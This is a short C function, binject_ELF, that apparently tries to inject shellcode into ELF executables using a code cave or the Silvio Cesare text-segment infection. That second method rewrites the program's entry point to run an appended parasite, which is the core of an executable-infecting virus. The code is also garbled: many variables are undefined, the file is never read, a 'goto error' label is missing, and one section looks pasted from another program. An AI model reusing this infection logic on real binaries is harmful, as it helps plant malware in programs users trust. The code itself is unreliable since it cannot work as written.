int binject_ELF(char *file,char *shellcode,int method)
{
  uint32_t size;
  int i,x;
  int sclen=strlen(shellcode);
  FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
 size=ftell(f);
  char *file_buffer = calloc(1,size);
  if(method==CODE_CAVE)
  {
  for(i=0;i<sections;i++)
  {
       x=find_code_cave(sclen,section_start,section_end,file_buffer);
                        if(x!=0)
                        break;
  }
                        if(x!=0)
                        return 1;
                        }
  if(method==SILVIO_METHOD)
  {
	  for (phdr = (Elf32_Phdr *)pdata, i = 0; i < ehdr.e_phnum; i++) {
		if (offset) {
			phdr->p_offset += 4096;
		} else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
/* 
	is this the text segment ? Nothing says the offset must be 0 but it
	normally is.
*/
			
			ehdr.e_entry = p_vaddr+p_filesz;
			

			phdr->p_filesz += vlen;
			phdr->p_memsz += vlen;
		}

		++phdr;
	}
	  if (offset == 0) goto error;

/* patch the offset */
	*(long *)&v[vhoff] = offset;

/* read the shdr's */

	if (lseek(fd, ehdr.e_shoff, SEEK_SET) < 0) goto error;
	if (read(fd, (void *)sdata, slen) != slen) goto error;

/* update the shdr's to reflect the insertion of the parasite */

	for (shdr = (Elf32_Shdr *)sdata, i = 0; i < ehdr.e_shnum; i++) {
		if (shdr->sh_offset >= offset) {
			shdr->sh_offset += PAGE_SIZE;
/* is this the last text section? */
		} else if (shdr->sh_addr + shdr->sh_size == evaddr) {
/* if its not strip safe then we cant use it */
			if (shdr->sh_type != SHT_PROGBITS) goto error;

			shdr->sh_size += vlen;
		}

		++shdr;
	}

/* update ehdr to reflect new offsets */

	oshoff = ehdr.e_shoff;
	if (ehdr.e_shoff >= offset) ehdr.e_shoff += PAGE_SIZE;

}
           
  free(file_buffer);
}
